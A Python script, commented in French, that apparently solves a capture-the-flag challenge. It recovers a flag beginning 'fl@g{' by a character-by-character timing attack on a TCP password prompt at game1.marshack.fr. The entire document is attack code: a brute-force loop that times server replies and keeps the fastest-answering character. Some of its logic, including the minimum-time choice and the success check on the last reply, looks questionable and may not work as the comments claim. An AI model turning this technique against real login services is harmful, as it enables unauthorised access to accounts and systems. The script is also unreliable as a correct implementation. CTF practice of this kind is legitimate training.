import socket
import time

# Détails de la connexion (adresse et port du serveur)
HOST = 'game1.marshack.fr'
PORT = 42010

# Fonction pour mesurer le temps de réponse pour une tentative de mot de passe
def measure_response_time(password):
    try:
        # Création de la socket et connexion au serveur
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            # Envoyer le mot de passe (en tant que chaîne de caractères suivie d'un retour à la ligne)
            s.sendall(password.encode('utf-8') + b'\n')

            # Mesurer le temps de réponse
            start_time = time.time()
            response = s.recv(4096)  # Réception d'une partie de la réponse du serveur
            end_time = time.time()

            response_time = end_time - start_time
            return response_time, response.decode('utf-8')
    except Exception as e:
        print(f"Erreur dans la connexion ou l'envoi : {e}")
        return None, None

# Fonction de brute force avec analyse du temps de réponse
def attack_password():
    # Commencer avec le mot de passe partiellement connu
    correct_password = "fl@g{"  # Vous avez déjà trouvé "fl@g{"
    possible_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[{]}|;:',<.>/?`~"  # Caractères possibles

    while True:
        min_time = float('inf')  # Initialiser le temps minimum à un très grand nombre
        best_char = None
        
        # Essayer chaque caractère possible et mesurer le temps de réponse
        for char in possible_chars:
            test_password = correct_password + char
            print(f"Tentative avec le mot de passe : {test_password}")
            response_time, response = measure_response_time(test_password)

            if response_time is None:
                continue

            print(f"Temps de réponse pour {test_password}: {response_time:.4f} secondes")

            # Si cette tentative a pris moins de temps, c'est probablement le bon caractère
            if response_time < min_time:
                min_time = response_time
                best_char = char
        
        if best_char is not None:
            correct_password += best_char
            print(f"Mot de passe actuel (partiel) : {correct_password}")
        
        # Vérifier si le mot de passe est correct (en fonction de la réponse du serveur)
        if "Félicitations" in response:  # Adapté en fonction de la réponse de votre serveur
            print(f"Mot de passe trouvé : {correct_password}")
            break

if __name__ == "__main__":
    print("Début de l'attaque par timing sur le mot de passe...")
    attack_password()
